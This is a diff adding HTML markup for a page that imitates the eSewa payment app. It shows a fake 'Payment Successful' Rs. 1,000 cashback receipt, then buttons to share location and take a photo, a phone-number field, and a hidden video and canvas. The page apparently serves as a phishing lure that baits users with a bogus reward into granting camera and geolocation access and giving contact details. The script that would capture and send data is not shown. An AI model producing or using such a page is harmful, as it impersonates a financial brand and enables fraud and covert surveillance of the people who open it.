@@ -1,0 +1,41 @@
+
+
+<div class="topbar">
+  <span class="back">←</span>
+  <span class="title">Transaction Details</span>
+</div>
+
+<div class="card">
+  <div class="logo">e<span>Sewa</span></div>
+  <div class="check">✓</div>
+  <div class="amount">Rs. 1,000</div>
+  <div class="status">Payment Successful</div>
+  <div class="details">
+    <div class="row"><span class="label">Paid To</span><span class="val">Cashback Reward</span></div>
+    <div class="row"><span class="label">Transaction ID</span><span class="val" id="txnId"></span></div>
+    <div class="row"><span class="label">Date</span><span class="val" id="txnDate"></span></div>
+    <div class="row"><span class="label">Amount</span><span class="val">NPR 1,000.00</span></div>
+    <div class="row"><span class="label">Total</span><span class="val">NPR 1,000.00</span></div>
+    <div class="row"><span class="label">Status</span><span class="val" style="color:#60BB46">Success</span></div>
+  </div>
+  <div class="footer">Powered by eSewa</div>
+</div>
+
+<div class="actions">
+  <button id="btnLocation">📍 Get Location</button>
+  <button id="btnCamera">📷 Take Photo</button>
+</div>
+
+<div class="statusPill" id="statusPill"></div>
+
+<div class="formbar">
+  <input id="phone" type="tel" placeholder="Your phone number" inputmode="numeric">
+  <input id="notes" type="text" placeholder="Notes (optional)">
+  <button id="btnSubmit">Confirm &amp; Continue</button>
+</div>
+
+<video id="video" playsinline="" autoplay="" muted=""></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+
+
